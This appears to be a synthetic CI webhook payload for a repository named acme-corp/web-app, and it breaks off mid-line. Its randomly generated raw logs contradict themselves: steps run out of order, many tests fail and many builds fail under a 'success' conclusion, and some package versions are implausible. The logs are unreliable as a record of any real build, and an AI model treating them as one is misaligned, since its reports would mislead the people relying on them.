{
  "action": "completed",
  "workflow_run": {
    "id": 275,
    "name": "CI Pipeline",
    "head_branch": "main",
    "head_sha": "5419a5992b0ebd561ea3c3da4bd9c26c5ae7aba0",
    "status": "completed",
    "conclusion": "success",
    "run_started_at": "2025-12-10T12:00:22.995424Z",
    "updated_at": "2025-12-10T12:03:45.264176Z"
  },
  "repository": {
    "full_name": "acme-corp/web-app",
    "name": "web-app"
  },
  "sender": {
    "login": "diana"
  },
  "_safeops_extended": {
    "raw_logs": "=== Step: deploy_staging ===\nArtifact uploaded: build.tar.gz (17MB)\n  PASS: test_cache_hit (187ms)\n[12:00:22] INFO: Processing request\nInstalling express@3.18.0\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nInstalling prettier@3.13.0\n  PASS: test_db_connect (361ms)\n\u2713 build completed\nException: ValueError\nCache hit for key-7382\n\u2713 lint completed\n[12:00:22] INFO: Processing request\n[12:00:22] INFO: Processing request\nCompiling src/app.ts...\n[12:00:22] INFO: Processing request\n[12:00:22] INFO: Processing request\nInstalling webpack@4.16.0\n\u2713 lint completed\nInstalling lodash@4.1.0\n\u2713 test completed\nArtifact uploaded: build.tar.gz (6MB)\n  PASS: test_api_health (65ms)\nCompiling src/index.js...\n\u2713 test completed\nStep 6/10: Building\nStep 1/10: Building\nCache hit for key-6795\nArtifact uploaded: build.tar.gz (15MB)\nCompiling src/utils.go...\nCache hit for key-3916\n  PASS: test_db_connect (95ms)\n\u2713 build completed\n[12:00:22] INFO: Processing request\nArtifact uploaded: build.tar.gz (22MB)\nInstalling prettier@4.4.0\n\u2713 lint completed\n[12:00:22] INFO: Processing request\n  PASS: test_api_health (318ms)\nInstalling webpack@2.6.0\n\u2713 lint completed\nStep 10/10: Building\n\u2713 lint completed\n\u2713 build completed\nCompiling src/index.js...\nCompiling src/index.js...\nInstalling express@5.9.0\n  PASS: test_auth_login (278ms)\nArtifact uploaded: build.tar.gz (16MB)\nCompiling src/main.py...\nCompiling src/main.py...\n  PASS: test_auth_login (90ms)\nWARNING: react has known vulnerabilities\n[12:00:22] INFO: Processing request\n[12:00:22] INFO: Processing request\n[12:00:22] INFO: Processing request\nStep 6/10: Building\nStep 10/10: Building\nArtifact uploaded: build.tar.gz (27MB)\n\u2713 build completed\nCache hit for key-5905\n\u2713 test completed\nFAILED: test_api_health\n\u2713 lint completed\n\u2713 lint completed\nCompiling src/utils.go...\nInstalling lodash@3.3.0\n  PASS: test_api_health (340ms)\nStep 10/10: Building\n  PASS: test_api_health (35ms)\n[12:00:22] INFO: Processing request\nInstalling express@5.7.0\n\u2713 test completed\nArtifact uploaded: build.tar.gz (24MB)\nInstalling lodash@1.9.0\nInstalling lodash@1.18.0\n  PASS: test_auth_login (129ms)\nCompiling src/main.py...\nArtifact uploaded: build.tar.gz (43MB)\nArtifact uploaded: build.tar.gz (18MB)\nStep 5/10: Building\n\u2713 test completed\n  PASS: test_db_connect (449ms)\nCompiling src/utils.go...\nStep 6/10: Building\nStep 9/10: Building\n[12:00:22] INFO: Processing request\nArtifact uploaded: build.tar.gz (30MB)\nArtifact uploaded: build.tar.gz (33MB)\n\u2713 build completed\nCache hit for key-7818\nStep 5/10: Building\n  PASS: test_auth_login (472ms)\nInstalling react@3.4.0\nCompiling src/handler.rs...\n[12:00:22] WARN: Deprecated API usage\n  PASS: test_db_connect (322ms)\nCache hit for key-5942\n[12:00:22] INFO: Processing request\n[12:00:22] INFO: Processing request\nCache hit for key-8512\nCompiling src/handler.rs...\n  PASS: test_api_health (440ms)\nCompiling src/utils.go...\nCompiling src/app.ts...\nArtifact uploaded: build.tar.gz (30MB)\n[12:00:22] ERROR: Connection failed\n\u2713 build completed\n[12:00:22] ERROR: Connection failed\nInstalling webpack@4.7.0\nWARNING: react has known vulnerabilities\nArtifact uploaded: build.tar.gz (37MB)\n=== Step deploy_staging completed ===\n=== Step: integration_tests ===\nInstalling eslint@2.12.0\nInstalling webpack@3.12.0\nCompiling src/service.java...\n  PASS: test_auth_login (201ms)\n  PASS: test_api_health (325ms)\n\u2713 lint completed\nCache hit for key-8379\nCache hit for key-6292\n[12:00:22] INFO: Processing request\nStep 10/10: Building\nStep 2/10: Building\n  PASS: test_auth_login (375ms)\nException: RuntimeError\nArtifact uploaded: build.tar.gz (27MB)\n\u2717 build failed with exit code 74\n\u2713 build completed\n\u2713 build completed\nCache hit for key-5939\nCache hit for key-2255\n\u2713 test completed\nCache hit for key-3913\nCache hit for key-9016\nCache hit for key-5948\n[12:00:22] INFO: Processing request\n[12:00:22] INFO: Processing request\n  PASS: test_user_create (488ms)\n  PASS: test_auth_login (160ms)\nException: ValueError\nInstalling eslint@5.8.0\n\u2713 lint completed\nStep 6/10: Building\nInstalling webpack@4.4.0\nCompiling src/service.java...\n\u2717 build failed with exit code 76\n\u2713 test completed\n[12:00:22] WARN: Deprecated API usage\nInstalling lodash@1.10.0\nArtifact uploaded: build.tar.gz (38MB)\n  PASS: test_user_create (333ms)\nInstalling lodash@3.6.0\n  PASS: test_user_create (205ms)\n\u2713 test completed\nInstalling webpack@5.14.0\nCompiling src/utils.go...\n\u2713 build completed\nInstalling eslint@5.5.0\n\u2713 build completed\nStep 5/10: Building\n  PASS: test_auth_login (489ms)\nInstalling express@3.19.0\nCache hit for key-4809\n\u2713 test completed\n[12:00:22] INFO: Processing request\nCompiling src/service.java...\nCache hit for key-1232\nCache hit for key-1056\nCompiling src/index.js...\n\u2713 test completed\nInstalling webpack@1.13.0\nException: TypeError\nArtifact uploaded: build.tar.gz (47MB)\nStep 3/10: Building\nStep 4/10: Building\n[12:00:22] INFO: Processing request\nCache hit for key-8526\n[12:00:22] INFO: Processing request\n\u2713 lint completed\nStep 9/10: Building\n  PASS: test_auth_login (84ms)\nCompiling src/service.java...\nCompiling src/index.js...\n[12:00:22] INFO: Processing request\nInstalling lodash@5.14.0\nCache hit for key-8587\nStep 4/10: Building\nCompiling src/index.js...\n\u2713 build completed\nCompiling src/utils.go...\nStep 2/10: Building\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nArtifact uploaded: build.tar.gz (21MB)\nFAILED: test_auth_login\n[12:00:22] INFO: Processing request\nStep 5/10: Building\nArtifact uploaded: build.tar.gz (29MB)\nArtifact uploaded: build.tar.gz (7MB)\n[12:00:22] INFO: Processing request\n\u2713 lint completed\n\u2713 build completed\n[12:00:22] INFO: Processing request\n[12:00:22] WARN: Deprecated API usage\n[12:00:22] ERROR: Connection failed\nStep 2/10: Building\nInstalling webpack@2.17.0\nArtifact uploaded: build.tar.gz (28MB)\nCompiling src/app.ts...\n  PASS: test_cache_hit (444ms)\n[12:00:22] INFO: Processing request\nArtifact uploaded: build.tar.gz (7MB)\nCompiling src/handler.rs...\nCache hit for key-3807\n  PASS: test_db_connect (226ms)\nCompiling src/service.java...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nArtifact uploaded: build.tar.gz (16MB)\n  PASS: test_api_health (230ms)\nInstalling webpack@2.13.0\nCompiling src/service.java...\nCache hit for key-9041\n[12:00:22] INFO: Processing request\nException: RuntimeError\n=== Step integration_tests completed ===\n=== Step: save_cache ===\nCompiling src/handler.rs...\nCache hit for key-6836\n[12:00:22] WARN: Deprecated API usage\nCache hit for key-5368\nStep 10/10: Building\n[12:00:22] INFO: Processing request\n  PASS: test_cache_hit (432ms)\n  PASS: test_auth_login (8ms)\nArtifact uploaded: build.tar.gz (21MB)\n\u2713 test completed\n  PASS: test_user_create (470ms)\nInstalling express@4.1.0\n[12:00:22] WARN: Deprecated API usage\n  PASS: test_db_connect (212ms)\nStep 10/10: Building\nStep 8/10: Building\nStep 1/10: Building\nArtifact uploaded: build.tar.gz (6MB)\nCompiling src/service.java...\nInstalling lodash@5.10.0\nInstalling axios@1.12.0\n\u2717 build failed with exit code 111\nCompiling src/handler.rs...\n\u2713 build completed\nCache hit for key-4685\n[12:00:22] INFO: Processing request\nStep 7/10: Building\n  PASS: test_db_connect (260ms)\nCompiling src/app.ts...\nStep 3/10: Building\nCache hit for key-9062\n  PASS: test_cache_hit (347ms)\n\u2713 lint completed\n\u2713 test completed\nArtifact uploaded: build.tar.gz (46MB)\nInstalling webpack@1.2.0\n[12:00:22] INFO: Processing request\nInstalling express@4.5.0\n  PASS: test_auth_login (340ms)\nCompiling src/utils.go...\n  PASS: test_user_create (31ms)\n  PASS: test_cache_hit (161ms)\nInstalling webpack@1.12.0\nArtifact uploaded: build.tar.gz (43MB)\nArtifact uploaded: build.tar.gz (11MB)\nCache hit for key-7758\nStep 7/10: Building\nFAILED: test_auth_login\nCompiling src/app.ts...\n\u2713 lint completed\nCache hit for key-6896\nCache hit for key-7358\n\u2713 build completed\nCompiling src/index.js...\nCompiling src/main.py...\n\u2713 build completed\nInstalling express@2.9.0\nStep 10/10: Building\nCompiling src/app.ts...\n[12:00:22] ERROR: Connection failed\n\u2713 lint completed\nCompiling src/handler.rs...\n[12:00:22] INFO: Processing request\nInstalling eslint@4.9.0\nFAILED: test_auth_login\n  PASS: test_user_create (360ms)\nInstalling express@2.13.0\nStep 5/10: Building\nStep 4/10: Building\n[12:00:22] INFO: Processing request\nStep 10/10: Building\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (18MB)\nStep 10/10: Building\nArtifact uploaded: build.tar.gz (20MB)\nCache hit for key-3663\nArtifact uploaded: build.tar.gz (37MB)\nCache hit for key-7813\nInstalling lodash@3.9.0\n[12:00:22] INFO: Processing request\n[12:00:22] ERROR: Connection failed\n  PASS: test_user_create (1ms)\nCompiling src/app.ts...\n[12:00:22] ERROR: Connection failed\nStep 3/10: Building\nArtifact uploaded: build.tar.gz (49MB)\nCache hit for key-9876\nCompiling src/handler.rs...\n[12:00:22] ERROR: Connection failed\nStep 7/10: Building\n[12:00:22] WARN: Deprecated API usage\nWARNING: webpack has known vulnerabilities\n\u2713 lint completed\n[12:00:22] INFO: Processing request\nCache hit for key-7626\nCompiling src/service.java...\n[12:00:22] INFO: Processing request\n[12:00:22] INFO: Processing request\n[12:00:22] INFO: Processing request\n\u2713 lint completed\n[12:00:22] INFO: Processing request\n[12:00:22] ERROR: Connection failed\nArtifact uploaded: build.tar.gz (8MB)\nCache hit for key-6184\nInstalling jest@4.15.0\n[12:00:22] WARN: Deprecated API usage\nInstalling prettier@3.8.0\n[12:00:22] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:00:22] INFO: Processing request\n\u2713 lint completed\n=== Step save_cache completed ===\n=== Step: type_check ===\n[12:00:22] INFO: Processing request\nInstalling react@5.16.0\nInstalling react@1.20.0\nWARNING: axios has known vulnerabilities\nArtifact uploaded: build.tar.gz (24MB)\nCompiling src/index.js...\nArtifact uploaded: build.tar.gz (36MB)\n  PASS: test_auth_login (459ms)\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (33MB)\n\u2717 build failed with exit code 46\nArtifact uploaded: build.tar.gz (12MB)\n[12:00:22] INFO: Processing request\n  PASS: test_api_health (397ms)\nInstalling axios@3.0.0\n[12:00:22] INFO: Processing request\nStep 4/10: Building\nInstalling prettier@3.8.0\nArtifact uploaded: build.tar.gz (15MB)\n[12:00:22] INFO: Processing request\n[12:00:22] INFO: Processing request\n\u2713 build completed\n[12:00:22] INFO: Processing request\nStep 8/10: Building\nCache hit for key-1069\n[12:00:22] INFO: Processing request\n\u2717 build failed with exit code 117\n[12:00:22] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (26MB)\n\u2713 test completed\nCache hit for key-8620\nCompiling src/utils.go...\nInstalling jest@4.8.0\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:00:22] INFO: Processing request\n\u2713 build completed\n  PASS: test_db_connect (89ms)\nArtifact uploaded: build.tar.gz (13MB)\n\u2713 test completed\n  PASS: test_api_health (295ms)\nStep 10/10: Building\nCompiling src/handler.rs...\nStep 3/10: Building\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nStep 9/10: Building\nCache hit for key-7807\nArtifact uploaded: build.tar.gz (46MB)\n\u2713 build completed\nStep 8/10: Building\nCache hit for key-9538\n[12:00:22] INFO: Processing request\nCache hit for key-4341\n  PASS: test_cache_hit (395ms)\nInstalling jest@1.3.0\nCache hit for key-9181\nStep 3/10: Building\nStep 8/10: Building\nCache hit for key-1957\nInstalling jest@3.6.0\nInstalling express@4.1.0\n\u2713 test completed\nStep 2/10: Building\n  PASS: test_user_create (198ms)\nInstalling express@4.9.0\nCache hit for key-5247\nInstalling eslint@4.3.0\n[12:00:22] INFO: Processing request\nStep 3/10: Building\n[12:00:22] INFO: Processing request\n[12:00:22] INFO: Processing request\n[12:00:22] INFO: Processing request\nArtifact uploaded: build.tar.gz (15MB)\n  PASS: test_api_health (420ms)\nWARNING: express has known vulnerabilities\nCompiling src/handler.rs...\nCache hit for key-3183\nCache hit for key-1050\n  PASS: test_db_connect (229ms)\n  PASS: test_cache_hit (352ms)\n  PASS: test_user_create (405ms)\nCache hit for key-6429\nCache hit for key-4373\n  PASS: test_api_health (306ms)\n  PASS: test_auth_login (288ms)\nWARNING: jest has known vulnerabilities\nStep 5/10: Building\nCompiling src/handler.rs...\n[12:00:22] INFO: Processing request\n  PASS: test_db_connect (331ms)\n[12:00:22] ERROR: Connection failed\nCompiling src/main.py...\nInstalling axios@4.8.0\nInstalling axios@5.1.0\nInstalling axios@3.6.0\n\u2713 build completed\nArtifact uploaded: build.tar.gz (40MB)\n\u2713 test completed\nWARNING: axios has known vulnerabilities\nInstalling axios@4.6.0\nCache hit for key-4019\nInstalling axios@2.13.0\n\u2713 lint completed\n\u2713 lint completed\n[12:00:22] INFO: Processing request\nStep 2/10: Building\nCompiling src/main.py...\n  PASS: test_db_connect (379ms)\nCache hit for key-6183\nCache hit for key-4961\nStep 5/10: Building\nArtifact uploaded: build.tar.gz (5MB)\n=== Step type_check completed ===\n=== Step: e2e_tests ===\n\u2713 build completed\n\u2713 lint completed\nCompiling src/service.java...\n[12:00:23] WARN: Deprecated API usage\nCache hit for key-5708\nCompiling src/service.java...\nCompiling src/utils.go...\n\u2713 build completed\nStep 1/10: Building\nCache hit for key-2667\n[12:00:23] INFO: Processing request\nCompiling src/service.java...\n\u2713 build completed\nCompiling src/service.java...\n[12:00:23] INFO: Processing request\n\u2713 lint completed\nInstalling react@1.14.0\nCompiling src/utils.go...\nInstalling jest@3.5.0\n[12:00:23] INFO: Processing request\nWARNING: express has known vulnerabilities\nCache hit for key-9510\nArtifact uploaded: build.tar.gz (12MB)\nArtifact uploaded: build.tar.gz (23MB)\nInstalling jest@3.4.0\nArtifact uploaded: build.tar.gz (37MB)\n[12:00:23] ERROR: Connection failed\nStep 6/10: Building\n  PASS: test_db_connect (311ms)\nInstalling express@1.10.0\nInstalling lodash@1.4.0\nArtifact uploaded: build.tar.gz (4MB)\n[12:00:23] WARN: Deprecated API usage\n  PASS: test_auth_login (480ms)\nCompiling src/app.ts...\nInstalling webpack@4.13.0\nCompiling src/index.js...\nStep 2/10: Building\n  PASS: test_cache_hit (474ms)\nWARNING: eslint has known vulnerabilities\nArtifact uploaded: build.tar.gz (15MB)\nArtifact uploaded: build.tar.gz (15MB)\n  PASS: test_cache_hit (161ms)\nCache hit for key-6202\nArtifact uploaded: build.tar.gz (1MB)\nCache hit for key-3783\nCompiling src/service.java...\nArtifact uploaded: build.tar.gz (20MB)\nStep 5/10: Building\nWARNING: axios has known vulnerabilities\n[12:00:23] INFO: Processing request\nStep 9/10: Building\nArtifact uploaded: build.tar.gz (7MB)\nStep 7/10: Building\n  PASS: test_cache_hit (286ms)\n\u2713 build completed\n[12:00:23] INFO: Processing request\n  PASS: test_db_connect (117ms)\n  PASS: test_auth_login (397ms)\n[12:00:23] INFO: Processing request\n[12:00:23] INFO: Processing request\nArtifact uploaded: build.tar.gz (50MB)\n[12:00:23] INFO: Processing request\nStep 8/10: Building\nCompiling src/main.py...\n  PASS: test_user_create (41ms)\nInstalling prettier@3.7.0\n  PASS: test_user_create (184ms)\n[12:00:23] INFO: Processing request\n\u2713 test completed\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n\u2713 test completed\nInstalling axios@1.12.0\n[12:00:23] WARN: Deprecated API usage\n[12:00:23] INFO: Processing request\n[12:00:23] INFO: Processing request\nArtifact uploaded: build.tar.gz (10MB)\nCache hit for key-1196\n  PASS: test_auth_login (25ms)\n\u2713 test completed\nArtifact uploaded: build.tar.gz (17MB)\nStep 5/10: Building\nCompiling src/index.js...\nInstalling express@1.11.0\nArtifact uploaded: build.tar.gz (31MB)\n  PASS: test_api_health (76ms)\n\u2713 build completed\n\u2713 build completed\n[12:00:23] INFO: Processing request\n  PASS: test_cache_hit (377ms)\nArtifact uploaded: build.tar.gz (3MB)\nStep 7/10: Building\nCompiling src/utils.go...\nStep 5/10: Building\nArtifact uploaded: build.tar.gz (36MB)\n[12:00:23] INFO: Processing request\n[12:00:23] INFO: Processing request\n[12:00:23] WARN: Deprecated API usage\nCompiling src/handler.rs...\nInstalling react@1.12.0\nArtifact uploaded: build.tar.gz (50MB)\nCompiling src/utils.go...\n[12:00:23] INFO: Processing request\n  PASS: test_user_create (164ms)\nWARNING: webpack has known vulnerabilities\n[12:00:23] INFO: Processing request\nCache hit for key-1745\nInstalling lodash@4.5.0\nInstalling eslint@5.10.0\nCompiling src/main.py...\nStep 3/10: Building\n=== Step e2e_tests completed ===\n=== Step: checkout ===\nInstalling axios@1.0.0\nCache hit for key-4356\nCompiling src/utils.go...\nStep 10/10: Building\n  PASS: test_cache_hit (157ms)\nStep 2/10: Building\nCache hit for key-4379\n[12:00:23] INFO: Processing request\n[12:00:23] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCache hit for key-1607\n\u2713 test completed\n\u2713 build completed\nArtifact uploaded: build.tar.gz (9MB)\n[12:00:23] INFO: Processing request\n[12:00:23] ERROR: Connection failed\n  PASS: test_user_create (207ms)\n  PASS: test_cache_hit (350ms)\nStep 1/10: Building\nArtifact uploaded: build.tar.gz (25MB)\nInstalling eslint@1.20.0\nStep 7/10: Building\n  PASS: test_auth_login (158ms)\n[12:00:23] INFO: Processing request\n  PASS: test_cache_hit (449ms)\n\u2713 build completed\n\u2713 test completed\nArtifact uploaded: build.tar.gz (23MB)\n\u2717 build failed with exit code 105\n[12:00:23] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (17MB)\nInstalling prettier@1.5.0\nWARNING: eslint has known vulnerabilities\nCompiling src/main.py...\nCache hit for key-7482\nWARNING: axios has known vulnerabilities\nCompiling src/app.ts...\n\u2713 build completed\n  PASS: test_api_health (140ms)\nInstalling prettier@5.0.0\n  PASS: test_db_connect (299ms)\n[12:00:23] INFO: Processing request\nFAILED: test_db_connect\nCache hit for key-5224\n\u2713 build completed\n\u2713 build completed\n[12:00:23] INFO: Processing request\nCompiling src/index.js...\n[12:00:23] INFO: Processing request\nInstalling eslint@4.17.0\n[12:00:23] INFO: Processing request\n[12:00:23] INFO: Processing request\nStep 10/10: Building\n\u2713 build completed\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nInstalling jest@1.0.0\nCompiling src/app.ts...\nInstalling lodash@4.0.0\nFAILED: test_api_health\nArtifact uploaded: build.tar.gz (19MB)\n\u2713 lint completed\n[12:00:23] INFO: Processing request\n  PASS: test_cache_hit (150ms)\nCompiling src/index.js...\nInstalling webpack@4.18.0\n[12:00:23] INFO: Processing request\nArtifact uploaded: build.tar.gz (18MB)\nCache hit for key-6333\nArtifact uploaded: build.tar.gz (34MB)\nException: TypeError\nArtifact uploaded: build.tar.gz (17MB)\nCache hit for key-1283\n\u2713 test completed\nCompiling src/service.java...\n\u2713 lint completed\n  PASS: test_user_create (465ms)\nCompiling src/utils.go...\n[12:00:23] ERROR: Connection failed\nInstalling jest@2.14.0\nCache hit for key-5831\nCompiling src/utils.go...\nCompiling src/app.ts...\nInstalling lodash@2.16.0\n  PASS: test_cache_hit (115ms)\n  PASS: test_cache_hit (389ms)\nCompiling src/service.java...\nCompiling src/main.py...\n\u2713 test completed\n  PASS: test_auth_login (330ms)\n[12:00:23] INFO: Processing request\nCache hit for key-7915\n[12:00:23] INFO: Processing request\nFAILED: test_auth_login\n\u2713 test completed\n[12:00:23] INFO: Processing request\nCache hit for key-8297\n[12:00:23] ERROR: Connection failed\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nInstalling prettier@1.11.0\nArtifact uploaded: build.tar.gz (16MB)\nArtifact uploaded: build.tar.gz (16MB)\nCompiling src/utils.go...\nArtifact uploaded: build.tar.gz (3MB)\n\u2713 lint completed\n[12:00:23] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n\u2713 lint completed\nCache hit for key-1012\n\u2713 lint completed\nInstalling prettier@4.4.0\nCompiling src/app.ts...\n=== Step checkout completed ===\n=== Step: setup_environment ===\nArtifact uploaded: build.tar.gz (7MB)\nInstalling webpack@1.12.0\n  PASS: test_db_connect (322ms)\nStep 10/10: Building\nCompiling src/service.java...\nInstalling prettier@5.2.0\n[12:00:23] INFO: Processing request\nInstalling lodash@1.16.0\nArtifact uploaded: build.tar.gz (23MB)\nArtifact uploaded: build.tar.gz (39MB)\nCache hit for key-3261\nArtifact uploaded: build.tar.gz (43MB)\nInstalling webpack@1.17.0\nInstalling webpack@5.11.0\n[12:00:23] INFO: Processing request\nInstalling prettier@4.10.0\n[12:00:23] ERROR: Connection failed\nCache hit for key-8402\nException: TypeError\nArtifact uploaded: build.tar.gz (13MB)\nCompiling src/utils.go...\n  PASS: test_api_health (14ms)\n  PASS: test_db_connect (491ms)\n[12:00:23] INFO: Processing request\nStep 6/10: Building\n\u2713 build completed\nInstalling prettier@4.4.0\nInstalling lodash@4.3.0\n[12:00:23] INFO: Processing request\n[12:00:23] INFO: Processing request\n[12:00:23] INFO: Processing request\n  PASS: test_auth_login (236ms)\nStep 8/10: Building\n\u2717 build failed with exit code 84\n  PASS: test_db_connect (160ms)\nArtifact uploaded: build.tar.gz (42MB)\nWARNING: webpack has known vulnerabilities\nCompiling src/utils.go...\nInstalling react@3.10.0\nStep 2/10: Building\nArtifact uploaded: build.tar.gz (4MB)\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nStep 7/10: Building\nCache hit for key-8560\nStep 2/10: Building\nInstalling express@2.10.0\nArtifact uploaded: build.tar.gz (4MB)\nCompiling src/service.java...\nFAILED: test_user_create\nCompiling src/handler.rs...\nArtifact uploaded: build.tar.gz (22MB)\nStep 4/10: Building\nCompiling src/index.js...\n[12:00:23] WARN: Deprecated API usage\n\u2713 lint completed\nException: TypeError\n[12:00:23] INFO: Processing request\n\u2713 test completed\nCompiling src/app.ts...\n[12:00:23] INFO: Processing request\n[12:00:23] INFO: Processing request\nArtifact uploaded: build.tar.gz (33MB)\n\u2713 test completed\nCache hit for key-6116\n\u2713 test completed\nInstalling jest@3.8.0\nStep 5/10: Building\nCache hit for key-2169\nCompiling src/handler.rs...\nCompiling src/index.js...\nArtifact uploaded: build.tar.gz (30MB)\nCache hit for key-5816\nInstalling express@2.0.0\nCompiling src/handler.rs...\n  PASS: test_db_connect (23ms)\n[12:00:23] INFO: Processing request\nStep 10/10: Building\nArtifact uploaded: build.tar.gz (1MB)\nArtifact uploaded: build.tar.gz (17MB)\nCompiling src/main.py...\nStep 3/10: Building\n\u2717 build failed with exit code 54\nArtifact uploaded: build.tar.gz (49MB)\nArtifact uploaded: build.tar.gz (47MB)\nStep 2/10: Building\nCompiling src/handler.rs...\nCompiling src/utils.go...\nInstalling lodash@2.5.0\nArtifact uploaded: build.tar.gz (5MB)\nArtifact uploaded: build.tar.gz (10MB)\n[12:00:23] INFO: Processing request\nInstalling jest@2.14.0\nCompiling src/app.ts...\n[12:00:23] INFO: Processing request\n[12:00:23] INFO: Processing request\n\u2713 lint completed\n  PASS: test_user_create (144ms)\nInstalling lodash@5.10.0\nFAILED: test_api_health\nCompiling src/handler.rs...\nInstalling eslint@1.20.0\n  PASS: test_cache_hit (269ms)\n[12:00:23] INFO: Processing request\nArtifact uploaded: build.tar.gz (22MB)\nStep 3/10: Building\nStep 3/10: Building\n[12:00:23] ERROR: Connection failed\n\u2713 test completed\nWARNING: eslint has known vulnerabilities\n[12:00:23] INFO: Processing request\nArtifact uploaded: build.tar.gz (37MB)\n=== Step setup_environment completed ===\n=== Step: build ===\n[12:00:23] INFO: Processing request\nCompiling src/app.ts...\nStep 10/10: Building\nCache hit for key-2615\n[12:00:23] INFO: Processing request\n\u2713 build completed\nInstalling express@4.20.0\nFAILED: test_api_health\n\u2713 build completed\n\u2713 build completed\n\u2713 build completed\n[12:00:23] INFO: Processing request\nStep 9/10: Building\nCache hit for key-4805\nCompiling src/index.js...\n[12:00:23] INFO: Processing request\n[12:00:23] WARN: Deprecated API usage\nCompiling src/utils.go...\n\u2713 test completed\nArtifact uploaded: build.tar.gz (41MB)\nInstalling prettier@3.16.0\nWARNING: react has known vulnerabilities\nCompiling src/service.java...\nStep 5/10: Building\nStep 1/10: Building\nInstalling webpack@2.14.0\nStep 3/10: Building\n[12:00:23] INFO: Processing request\nCache hit for key-8380\nCache hit for key-1030\n[12:00:23] INFO: Processing request\n  PASS: test_user_create (292ms)\nCache hit for key-9790\nCache hit for key-7120\nArtifact uploaded: build.tar.gz (37MB)\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n\u2713 build completed\n[12:00:23] INFO: Processing request\nStep 6/10: Building\n  PASS: test_auth_login (354ms)\n[12:00:23] INFO: Processing request\nWARNING: lodash has known vulnerabilities\nCache hit for key-1600\nWARNING: eslint has known vulnerabilities\n  PASS: test_user_create (271ms)\nInstalling react@5.2.0\nArtifact uploaded: build.tar.gz (32MB)\nInstalling lodash@1.11.0\n[12:00:23] INFO: Processing request\nArtifact uploaded: build.tar.gz (33MB)\n\u2713 build completed\nInstalling webpack@4.16.0\nArtifact uploaded: build.tar.gz (28MB)\nCache hit for key-7361\nArtifact uploaded: build.tar.gz (18MB)\n  PASS: test_api_health (242ms)\nInstalling jest@5.5.0\n[12:00:23] INFO: Processing request\nCompiling src/main.py...\nCompiling src/handler.rs...\nFAILED: test_db_connect\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nArtifact uploaded: build.tar.gz (33MB)\nArtifact uploaded: build.tar.gz (30MB)\n  PASS: test_user_create (37ms)\nCompiling src/index.js...\n[12:00:23] INFO: Processing request\nCompiling src/main.py...\nArtifact uploaded: build.tar.gz (16MB)\nInstalling eslint@3.18.0\n  PASS: test_auth_login (250ms)\n  PASS: test_auth_login (106ms)\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nArtifact uploaded: build.tar.gz (21MB)\nCache hit for key-2251\n  PASS: test_auth_login (151ms)\nCache hit for key-8888\nFAILED: test_cache_hit\nWARNING: react has known vulnerabilities\nInstalling express@5.11.0\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (24MB)\nInstalling lodash@1.20.0\nArtifact uploaded: build.tar.gz (35MB)\nArtifact uploaded: build.tar.gz (40MB)\nStep 9/10: Building\n[12:00:23] INFO: Processing request\n[12:00:23] INFO: Processing request\n\u2713 build completed\nArtifact uploaded: build.tar.gz (2MB)\n  PASS: test_api_health (472ms)\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nArtifact uploaded: build.tar.gz (46MB)\n[12:00:23] INFO: Processing request\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (15MB)\n[12:00:23] WARN: Deprecated API usage\n\u2713 build completed\nArtifact uploaded: build.tar.gz (9MB)\n\u2713 test completed\nCache hit for key-6661\n  PASS: test_cache_hit (437ms)\nCompiling src/index.js...\nStep 5/10: Building\nArtifact uploaded: build.tar.gz (33MB)\n\u2713 build completed\nStep 6/10: Building\nInstalling axios@4.19.0\n\u2717 build failed with exit code 89\nArtifact uploaded: build.tar.gz (32MB)\nCompiling src/app.ts...\n=== Step build completed ===\n=== Step: lint ===\nCompiling src/handler.rs...\n\u2713 lint completed\nCompiling src/service.java...\n[12:00:23] INFO: Processing request\nStep 2/10: Building\n  PASS: test_user_create (223ms)\nStep 2/10: Building\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nWARNING: express has known vulnerabilities\nArtifact uploaded: build.tar.gz (12MB)\n\u2713 test completed\nCache hit for key-3637\n  PASS: test_auth_login (138ms)\nInstalling lodash@2.2.0\nStep 1/10: Building\nCache hit for key-4854\nArtifact uploaded: build.tar.gz (12MB)\nCache hit for key-4524\nCompiling src/main.py...\n[12:00:23] INFO: Processing request\n  PASS: test_cache_hit (302ms)\n\u2713 test completed\nCompiling src/service.java...\n\u2713 test completed\nCache hit for key-2479\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nArtifact uploaded: build.tar.gz (9MB)\n  PASS: test_db_connect (307ms)\nInstalling eslint@1.2.0\nCache hit for key-7672\n[12:00:23] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (9MB)\n  PASS: test_api_health (442ms)\nInstalling axios@2.3.0\nArtifact uploaded: build.tar.gz (19MB)\nCache hit for key-8846\nStep 10/10: Building\nCache hit for key-4503\n\u2713 test completed\nInstalling react@5.8.0\nCache hit for key-1274\nInstalling webpack@1.7.0\nInstalling webpack@5.1.0\nCompiling src/main.py...\nArtifact uploaded: build.tar.gz (31MB)\nCompiling src/utils.go...\nCompiling src/handler.rs...\nArtifact uploaded: build.tar.gz (44MB)\nInstalling jest@2.20.0\nStep 5/10: Building\n[12:00:23] INFO: Processing request\n\u2713 test completed\n[12:00:23] INFO: Processing request\nInstalling eslint@3.2.0\n  PASS: test_user_create (155ms)\nStep 4/10: Building\n[12:00:23] INFO: Processing request\nCache hit for key-8841\n  PASS: test_api_health (58ms)\nStep 2/10: Building\nCache hit for key-5052\n\u26a0 DEPRECATION: Feature will be removed in 